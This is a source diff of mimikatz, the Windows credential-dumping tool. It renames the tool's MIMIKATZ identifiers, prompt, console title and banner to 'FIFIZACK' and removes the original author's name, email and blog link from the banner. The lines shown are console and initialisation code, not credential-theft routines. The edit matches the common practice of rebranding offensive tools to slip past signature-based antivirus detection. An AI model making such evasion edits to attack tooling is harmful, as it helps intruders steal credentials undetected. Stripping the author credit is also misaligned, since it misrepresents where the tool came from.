@@ -40,15 +40,15 @@ int wmain(int argc, wchar_t * argv[])
 	wchar_t input[0xffff];
 #endif
 	mimikatz_begin();
-	for(i = MIMIKATZ_AUTO_COMMAND_START ; (i < argc) && (status != STATUS_FATAL_APP_EXIT) ; i++)
+	for(i = FIFIZACK_AUTO_COMMAND_START ; (i < argc) && (status != STATUS_FATAL_APP_EXIT) ; i++)
 	{
-		kprintf(L"\n" MIMIKATZ L"(" MIMIKATZ_AUTO_COMMAND_STRING L") # %s\n", argv[i]);
+		kprintf(L"\n" FIFIZACK L"(" FIFIZACK_AUTO_COMMAND_STRING L") # %s\n", argv[i]);
 		status = mimikatz_dispatchCommand(argv[i]);
 	}
 #ifndef _WINDLL
 	while (status != STATUS_FATAL_APP_EXIT)
 	{
-		kprintf(L"\n" MIMIKATZ L" # "); fflush(stdin);
+		kprintf(L"\n" FIFIZACK L" # "); fflush(stdin);
 		if(fgetws(input, ARRAYSIZE(input), stdin) && (len = wcslen(input)) && (input[0] != L'\n'))
 		{
 			if(input[len - 1] == L'\n')
@@ -66,16 +66,16 @@ void mimikatz_begin()
 {
 	kull_m_output_init();
 #ifndef _WINDLL
-	SetConsoleTitle(MIMIKATZ L" " MIMIKATZ_VERSION L" " MIMIKATZ_ARCH L" (oe.eo)");
+	SetConsoleTitle(FIFIZACK L" " FIFIZACK_VERSION L" " FIFIZACK_ARCH L" (oe.eo)");
 	SetConsoleCtrlHandler(HandlerRoutine, TRUE);
 #endif
 	kprintf(L"\n"
-		L"  .#####.   " MIMIKATZ_FULL L"\n"
-		L" .## ^ ##.  " MIMIKATZ_SECOND L"\n"
+		L"  .#####.   " FIFIZACK_FULL L"\n"
+		L" .## ^ ##.  " FIFIZACK_SECOND L"\n"
 		L" ## / \\ ##  /* * *\n"
-		L" ## \\ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n"
-		L" '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)\n"
-		L"  '#####'    " MIMIKATZ_SPECIAL L" with %2u modules * * */\n", ARRAYSIZE(mimikatz_modules));
+		L" ## \\ / ##   "
+		L" '## v ##'            (oe.eo)\n"
+		L"  '#####'    " FIFIZACK_SPECIAL L" with %2u modules * * */\n", ARRAYSIZE(mimikatz_modules));
 	mimikatz_initOrClean(TRUE);
 }
 
@@ -107,8 +107,8 @@ NTSTATUS mimikatz_initOrClean(BOOL Init)
 
 	if(Init)
 	{
-		RtlGetNtVersionNumbers(&MIMIKATZ_NT_MAJOR_VERSION, &MIMIKATZ_NT_MINOR_VERSION, &MIMIKATZ_NT_BUILD_NUMBER);
-		MIMIKATZ_NT_BUILD_NUMBER &= 0x00003fff;
+		RtlGetNtVersionNumbers(&FIFIZACK_NT_MAJOR_VERSION, &FIFIZACK_NT_MINOR_VERSION, &FIFIZACK_NT_BUILD_NUMBER);
+		FIFIZACK_NT_BUILD_NUMBER &= 0x00003fff;
 		offsetToFunc = FIELD_OFFSET(KUHL_M, pInit);
 		hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
 		if(FAILED(hr))
